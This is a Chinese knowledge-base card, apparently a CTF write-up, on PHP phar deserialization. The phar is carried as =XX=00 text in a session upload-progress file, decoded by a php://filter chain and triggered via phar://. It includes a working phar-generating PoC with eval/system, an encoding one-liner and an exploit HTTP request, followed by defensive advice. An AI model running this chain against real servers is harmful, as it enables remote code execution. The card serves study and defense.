---
id: web-php-deserialization-session-progress-phar-quotedprintable-filter-decode
title: phar 二进制无法直接上传时的落盘解法：把 phar 编成 =XX=00 文本塞进 session 文件，copy 到固定路径后用 base64/quoted-printable/iconv 多级 php://filter 还原再 phar:// 触发反序列化
type: scenario
domain: web
path: web/php/deserialization
technique: session-progress-phar-quotedprintable-multistage-filter-decode
tags:
- php
- deserialization
- phar
- php-filter
- session-upload-progress
- copy
- webshell
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:50:40+08:00'
  notes: 已对照原文核对；本次核对未读取图片；phar 生成脚本、=XX=00 编码命令（cat base64 -w0 后转 =XX=00）、PHP_SESSION_UPLOAD_PROGRESS 落 /tmp/sess_shushu、filename 经 copy 到 /tmp/tmp.tmp、php://filter/read=3x base64-decode|quoted-printable-decode|iconv.utf-16le.utf-8|base64-decode/resource=/tmp/sess_<name>、phar:///tmp/tmp.tmp/test.txt 触发 Admin::__destruct eval、waf 放行 web 目录与 /tmp 但拦 /etc/passwd、3^3 倍数 padding 均与正文一致。未验证点：phar 落地与 flag 回显仅见于截图；PoC 未复跑；CTF 题无组件版本区间。
url: /docs/web/php/deserialization/web-php-deserialization-session-progress-phar-quotedprintable-filter-decode/
draft: false
kb_aliases:
- phar 不能直接上传怎么打
- =00 编码 phar
- quoted-printable-decode 还原 phar
- iconv.utf-16le.utf-8 还原二进制
- session 文件当 phar 载体
- copy 任意文件复制成 phar
- 多次 base64-decode 消垃圾
---

## 一句话结论

当 phar 结构体没法作为文件直接上传、只能控制「某个已有文件的内容」时，把 phar 的每个字节写成 `=XX=00` 的文本形式塞进 `PHP_SESSION_UPLOAD_PROGRESS` 落成 session 文件，再用 `copy()` 把它复制成固定路径 `phar` 载体，最后用 `php://filter` 串「多次 `convert.base64-decode` 剔除垃圾 → `convert.quoted-printable-decode` 把 `=XX` 还原成字节 → `convert.iconv.utf-16le.utf-8` 丢掉 `=00`」把文本还原成二进制，`phar://` 一读即触发 metadata 反序列化，`__destruct` 里的 `eval` 执行代码。

## 原理

- **phar 触发的本质**：任何作用在 `phar://` 流上的文件函数（`file_get_contents`、`include`、`copy`、`file_exists` 等）都会解析 phar 归档，并把 `metadata` 反序列化成对象；对象销毁时 `__destruct()` 执行。所以只要能把**一段合法的 phar 字节流**放到服务器某个已知路径，就能触发 POP 链。
- **为什么要「编码再解码」**：很多题的落盘入口只能写文本（session 文件、日志、`upload_progress` 前缀），且写入点会先拼接自己的头（`upload_progress_<key>`、序列化包裹），直接写二进制会破坏 phar 结构，也无法通过 `copy` 之外的过滤。把字节写成 `=XX=00`（每字节一段 `=` + 两位十六进制 + `=00`）后是纯文本，可以安全塞进 session 值的字符串里。
- **三级过滤器为何按这个顺序**：
  1. `convert.base64-decode` 会把不在 base64 字母表内的字符**静默丢弃**，多跑几次就能把 session 文件头尾的垃圾（`upload_progress_ZZ`、`|a:1:...`）全部清除，只留下 payload 里的字母数字；
  2. `convert.quoted-printable-decode` 把 `=41=00=42=00...` 先还原成 `A\0B\0...`（即 UTF-16LE 形态的原始字节）；
  3. `convert.iconv.utf-16le.utf-8` 以 2 字节为一个码元解析，`=00`（即 NUL）作为高位字节随字符转换被吃掉/合并，输出的就是原始单字节流。
- **为什么要做 padding**：base64 编码长串时若长度不是 3 的倍数会出现 `=` 填充符，而下一轮 `base64-decode` 见到 `=` 会提前判定结束、解码失败。要连续跑 3 次 base64 解码，就得让每次编码结果都不出现 `=`，即把 `=XX=00` 串补齐到 3^3=27 的倍数（文中做法是补位数对齐）。
- **copy 的作用**：`copy($filename, "/tmp/tmp.tmp")` 把 session 文件（或任意可读文件）复制到题目固定读取的路径，解决「phar 路径必须是已知固定文件名」的问题；顺带也是一个受 waf 限制的任意文件复制原语（能复制 web 目录下文件，读 `/etc/passwd` 之类的路径被 waf 拦）。
- **POP 链部分**：`Admin` 类的 `__destruct()` 直接 `eval($this->code)`，且 `check_session()` 在校验签名不通过时 `die`，所以必须从 phar metadata 侧进入而不是伪造 cookie（`$SECRET` 来自 `/readsecret`，无法预测）。

## 触发条件

- 存在 `phar://` 可用的文件操作（本场景是 `copy()` + 后续 `include`/`file_get_contents` 经 `filename` 参数）。
- 能控制某个可读文件的内容：`PHP_SESSION_UPLOAD_PROGRESS` + `session.upload_progress.enabled=On`（默认开）即可把任意字符串写进 `/tmp/sess_<PHPSESSID>`。
- 有固定路径的复制/写入点（`copy($filename, "/tmp/tmp.tmp")`），且其 waf 允许把 session 文件（或 web 目录内文件）作为源。
- 存在可用的 POP 链（本例 `Admin::__destruct` → `eval`）。
- 知道 phar 内部的归档文件名（`test.txt`），因为 `phar://<path>/<entry>` 需要指定条目。

## 利用步骤

1. 先摸清 `filename` 的过滤：能 `copy` `/var/www/html/index.php` 但 `/etc/passwd` 失败，说明 waf 拦绝对敏感路径、放行 web 目录与 `/tmp`。
2. 本地生成恶意 phar：`setStub('<?php __HALT_COMPILER(); ?>')`，`setMetadata(new Admin)` 且 `code = system('/readflag');`，`addFromString("test.txt","test")`。
3. 把 phar 字节流编码成 `=XX=00` 形式：`cat test.phar | base64 -w0 | python3 -c "import sys;print(''.join(['='+hex(ord(i))[2:]+'=00' for i in sys.stdin.read()]).upper())"`。
4. 起一个请求，Cookie 固定 `PHPSESSID=<name>`，POST `PHP_SESSION_UPLOAD_PROGRESS=<payload>` 并带一个任意文件，让 session 文件写入该内容。
5. `filename=php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/tmp/sess_<name>`，借 `copy` 把解码后的二进制写到 `/tmp/tmp.tmp`。
6. `filename=phar:///tmp/tmp.tmp/test.txt` 触发 metadata 反序列化，`__destruct` 执行 `eval`，读取 flag。

PoC（生成 + 编码，本地执行，仅用于说明格式）：

```php
<?php
class Admin { public $code; }
@unlink('test.phar');
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Admin();
$o->code = "system('/readflag');";
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

```bash
cat test.phar | base64 -w0 | python3 -c "import sys;print(''.join(['='+hex(ord(i))[2:]+'=00' for i in sys.stdin.read()]).upper())"
```

请求形态（`filename` 参数直接作为 `copy` 的源）：

```http
GET /?filename=php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/tmp/sess_shushu HTTP/1.1
Cookie: PHPSESSID=shushu
```

## 变体与关联

- **载体变体**：session 文件之外，`upload_progress`、访问日志、缓存文件、`/tmp` 下任意可控文本文件都可以承载 `=XX=00` 串；`copy` 之外的 sink 有 `include`、`file_get_contents`、`getimagesize`、`fileowner`。
- **编码变体**：不使用 quoted-printable 时可用 `convert.iconv` 直接从指定字符集转到目标单字节集，或改用 gzip/zlib 压缩后 phar 仍可解析（见 PHAR 前缀绕过卡）。
- **过滤变体**：若 `php://filter` 被拦，可尝试 `compress.zlib://phar://`、`compress.bzip2://phar://` 前缀包装；若 `phar://` 被前缀正则拦，加 `php://filter/resource=phar://...` 包裹。
- **关联**：`web-php-deserialization-phar-prefix-wrapper-bypass`（前缀正则绕过）、`web-php-deserialization-phar-prefix-filter-halt-compiler-rce`（filter 包裹 + 受限 eval）、`web-php-deserialization-fileowner-phar-trigger-photogallery`（冷门 sink）、`web-php-deserialization-phar-sourcechain-zip-pgsql-sinks`（调用链枚举）。

## 检测与防御

- **禁用 phar 触发面**：PHP 8 起 `phar://` 仍可触发反序列化，最稳妥是业务侧禁止用户输入进入任何文件函数，或对路径做白名单 + `basename`，彻底挡掉 `://`。
- **会话隔离**：`session.upload_progress.enabled=Off`、`session.save_path` 置于不可被 web 读取的目录，避免 session 文件成为可控载体。
- **流量检测**：请求中出现 `php://filter` + 多段 `convert.`、或响应/参数中出现大量 `=XX=00` 形态即高度可疑；`copy()` 的源参数含 `php://`、`phar://`、`compress.` 前缀直接告警。
- **代码审计**：搜索 `copy(`、`include(`、`file_get_contents(` 的源参数来源；同时检查 `__destruct`/`__wakeup` 中是否含 `eval`/`system` 等直接执行。
